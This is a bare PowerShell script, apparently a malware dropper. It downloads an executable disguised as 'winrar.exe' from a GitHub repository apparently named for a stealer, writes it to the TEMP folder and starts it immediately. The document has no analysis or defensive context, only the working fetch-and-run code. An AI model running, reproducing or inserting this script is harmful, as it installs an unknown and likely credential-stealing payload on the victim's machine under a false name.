$dropperUrl = "https://raw.githubusercontent.com/StealerRo/Look/main/winrar.exe"
$tempPath = "$env:TEMP\winrar.exe"
Invoke-WebRequest -Uri $dropperUrl -OutFile $tempPath
Start-Process -FilePath $tempPath